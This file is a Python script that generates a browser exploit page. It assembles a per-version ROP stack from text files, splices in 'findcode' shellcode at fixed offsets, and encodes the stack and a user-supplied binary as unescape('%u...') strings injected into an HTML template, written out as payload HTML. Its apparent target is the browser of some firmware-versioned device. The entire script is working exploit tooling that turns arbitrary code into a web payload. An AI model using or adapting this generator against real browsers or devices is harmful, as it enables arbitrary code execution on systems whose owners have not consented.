#!/usr/bin/env python
import sys
import struct
import inspect
import os
import shutil

preserve_zeros = {
	'300': [0x14, 0x28, 0x40, 0xd0, 0xe8, 0x110, 0x128],
	'400': [0x14, 0x28, 0x40, 0xd0, 0xe8, 0x110, 0x128],
	'410': [0x1C],
	'500': [0x1C]
}

shellcode_offset = {
	'300': 0x160,
	'400': 0x160,
	'410': 0x1B0,
	'500': 0x1B0
}

def main():
	try:
		ar1=sys.argv[1]
		ar2=sys.argv[2]
		ar3=sys.argv[3]
	except:
		print("Usage python generate_html.py {code.bin} {version} {output directory}")
		return
	ver=""
	if int(ar2) >= 510:
		ver="500"
	else:
		ver=ar2
	filename = inspect.getframeinfo(inspect.currentframe()).filename
	path = os.path.dirname(os.path.abspath(filename))
	stack = build_stack(ver)
	findcode = open('{0}/bin/findcode{1}.bin'.format(path,ver), 'rb').read()
	stack = stack[:shellcode_offset[ver]] + findcode + stack[shellcode_offset[ver] + len(findcode):]
	
	stack_js = stack_to_js(stack,ver)
	code_js = code_to_js(open(ar1, 'rb').read())
	
	template = open('{0}/html/template.html'.format(path), 'r').read()
	page = template.replace('{{ stack }}', stack_js)
	page = page.replace('{{ code }}', code_js)
	
	#Copy over frame.html
	shutil.copy2('{0}/html/frame.html'.format(path), ar3)
	#Copy over index.html
	shutil.copy2('{0}/html/index.html'.format(path), ar3)
	file = open('{0}/payload{1}.html'.format(ar3,ver), 'w+')
	file.write(page)
	file.close()

def chunks(l, n):
	""" Yield successive n-sized chunks from l.
	"""
	for i in range(0, len(l), n):
		yield l[i:i+n]
		
def values_to_js(values):
	lines = []
	
	for i, chunk in enumerate(chunks(values, 0x10)):
		encoded = ''.join(['%u{}%u{}'.format('{:08x}'.format(value)[:4], '{:08x}'.format(value)[4:]) for value in chunk])
		if not i:
			lines.append('                var str = unescape("{}");'.format(encoded))
		else:
			lines.append('                str    += unescape("{}");'.format(encoded))           
	
	return '\n'.join(lines)

def stack_to_js(stack,ver):    
	values = []
	for i in range(0, len(stack), 4):
		value = struct.unpack('>I', stack[i:i+4])[0]
		if value or i in preserve_zeros[ver]:
			values.append(value)
		else:
			values.append(i)    
	
	return values_to_js(values)            

def code_to_js(code):
	code = b'\xca\xfe\xca\xfe' + code    
	values = []
	for i in range(0, 0x8000, 4):
		if i < len(code):
			code_value = code[i:i+4]
			code_value += b'\x00' * (4 - len(code_value))
			value = struct.unpack('>I', code_value)[0]
			values.append(value)
		else:
			values.append(i)
	
	return values_to_js(values)

def build_stack(ver):
	filename = inspect.getframeinfo(inspect.currentframe()).filename
	path = os.path.dirname(os.path.abspath(filename))
	text = open('{0}/stack/stack{1}.txt'.format(path,ver)).read()
	output = open('{0}/bin/stack{1}.bin'.format(path,ver), 'w+b')
	output.write(b'\x00' * 0x600)

	for line in text.splitlines():
		line = line.strip()
		if not line:
			continue
		addr = line.split(None, 1)[0]
		addr = int(addr, 16)

		value = line.split()[-1]
		if value.startswith('0x'):
			value = int(value, 16)

			output.seek(addr)
			output.write(struct.pack('>I', value))

	output.seek(0)
	return output.read()

if __name__ == '__main__':
	main()